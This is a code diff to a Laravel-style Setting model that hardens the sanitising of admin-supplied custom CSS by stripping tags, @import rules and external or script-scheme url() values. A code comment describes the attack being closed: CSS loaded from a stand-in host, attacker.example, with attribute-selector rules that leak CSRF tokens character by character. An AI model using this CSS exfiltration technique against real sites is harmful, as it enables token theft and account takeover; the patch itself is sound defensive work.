@@ -244,12 +244,44 @@ class Setting extends Model
     public function show_custom_css(): string
     {
         $custom_css = self::getSettings()->custom_css;
-        $custom_css = e($custom_css);
-        // Needed for modifying the bootstrap nav :(
-        $custom_css = str_ireplace('script', 'SCRIPTS-NOT-ALLOWED-HERE', $custom_css);
-        $custom_css = str_replace('&gt;', '>', $custom_css);
-        // Allow String output (needs quotes)
-        $custom_css = str_replace('&quot;', '"', $custom_css);
+        if ($custom_css === null || $custom_css === '') {
+            return '';
+        }
+
+        // Superuser-planted CSS renders inside <style> on every layout for
+        // every other superuser, so the sanitize step has to hold up as a
+        // CSS filter, not just an HTML filter. Two abuse primitives to
+        // shut down:
+        //
+        //   @import url("https://attacker.example/x.css") lets the planter
+        //   load an unrestricted external stylesheet, which can then use
+        //   attribute-selector rules (input[name="_token"][value^="a"]{...})
+        //   to exfiltrate CSRF tokens character by character on every page
+        //   load.
+        //
+        //   background: url("https://attacker.example/?t=...") reaches the
+        //   same primitive without @import as long as the value is any
+        //   absolute or protocol-relative URL. Same-origin relative paths
+        //   under /uploads/ etc. are fine for legit branding assets.
+        //
+        // strip_tags belt-and-braces guards against injection reaching a
+        // context that treats < as an HTML boundary. The old encode-then-
+        // selectively-decode chain silently undid its own work on > and "
+        // and did not touch either @import or url(), so it's gone.
+        $custom_css = strip_tags($custom_css);
+        $custom_css = preg_replace('/@import\s+[^;]*;?/i', '', $custom_css);
+        $custom_css = preg_replace_callback(
+            '/\burl\s*\(\s*([^)]*)\)/i',
+            function (array $match): string {
+                $value = trim($match[1], " \t\n\r\"'");
+                if ($value === '' || preg_match('#^(https?:)?//|^data:|^javascript:|^vbscript:#i', $value)) {
+                    return '';
+                }
+
+                return $match[0];
+            },
+            $custom_css,
+        );
 
         return $custom_css;
     }
